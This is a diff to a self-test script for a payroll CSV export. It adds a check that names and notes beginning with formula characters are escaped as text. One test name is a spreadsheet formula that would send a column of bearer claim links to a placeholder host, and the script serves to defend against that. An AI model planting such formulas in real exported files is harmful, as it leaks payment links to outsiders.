@@ -13,13 +13,18 @@
  *   - the shortfall, the run total and the invoice rounded to two decimals
  *     (0.004 showed as 0.00, Number lost units on big amounts); they are exact.
  *
+ * Security review, 25 Oct 2026: the results file put a payee's name, as typed
+ * in the list, in a cell a spreadsheet runs as a formula (=, +, -, @), next to
+ * the unclaimed rows' claim links, which are bearer codes. Such a cell now
+ * starts with an apostrophe, so it reads as text; the links stay as they are.
+ *
  * Run from app/:  ../mcp/node_modules/.bin/tsx scripts/selftest-payroll-csv.mts
  */
 import assert from "node:assert/strict";
 import "./browser-shim.mjs";
 import { parseUnits, type Address } from "viem";
 
-const { parsePayrollCsv, fundingPlan, PAYROLL_TEMPLATE } = await import("../src/lib/payroll");
+const { parsePayrollCsv, fundingPlan, PAYROLL_TEMPLATE, exportResultsCsv, claimLink } = await import("../src/lib/payroll");
 const { assetDecimals, formatAssetAmountExact } = await import("../src/lib/shield");
 
 let passed = 0;
@@ -176,6 +181,29 @@ test("exact amounts keep every unit", () => {
   assert.equal(formatAssetAmountExact(1_250_500_000_000_000_000_000n, NATIVE, 2), "1,250.50");
   assert.equal(formatAssetAmountExact("9007199254740993000000000000000001", NATIVE), "9,007,199,254,740,993.000000000000000001");
   assert.equal(formatAssetAmountExact(0n, NATIVE), "0");
+});
+
+// ------------------------------------------------------------------ results file
+
+test("the results file never writes a name as a formula, and keeps the claim links as they are", () => {
+  const names = ['=IMAGE("https://x.example/?"&TEXTJOIN(",",1,F:F))', "+1", "-1", "@SUM(A1)", "\t=1", "Ada"];
+  const tickets = names.map((_, i) => `gloam1.eyJ2IjoxLCJrIjoi${i}`);
+  const batch = {
+    id: "b1", title: "Oct", createdAt: 0, chainId: 4663, pool: "0x39e28cde55cab798874746ac52cb4b5cc99a0194" as Address, asset: ASSET,
+    employer: "0x1111111111111111111111111111111111111111" as Address, relay: true, status: "done" as const,
+    rows: names.map((name, i) => ({ id: `r${i}`, name, recipient: "", kind: "link", amount: units("1"), status: "paid", ticket: tickets[i], note: i === 0 ? "=HYPERLINK(1)" : undefined })),
+  };
+  const out = exportResultsCsv(batch as never, { origin: "https://gloam.trade", networkKey: "robinhood-mainnet", assetLabel: "USDG", explorerTx: (h: string) => h });
+  const cells = (line: string) => [...line.matchAll(/("(?:[^"]|"")*"|[^,]*)(,|$)/g)].map((m) => m[1]!.replace(/^"([\s\S]*)"$/, "$1").replace(/""/g, '"')).slice(0, -1);
+  const lines = out.split("\n").slice(1);
+  lines.forEach((line, i) => {
+    const row = cells(line);
+    const name = row[0]!;
+    if (/^[=+\-@\t\r]/.test(names[i]!)) assert.equal(name, `'${names[i]}`, `row ${i}: the name reads as text`);
+    else assert.equal(name, names[i]);
+    assert.equal(row[5], claimLink("https://gloam.trade", "robinhood-mainnet", tickets[i]!), `row ${i}: the claim link is untouched`);
+  });
+  assert.ok(lines[0]!.endsWith(`"'=HYPERLINK(1)"`) || lines[0]!.endsWith(`'=HYPERLINK(1)`), "the note column too");
 });
 
 console.log(`\n${passed} payroll list checks passed`);
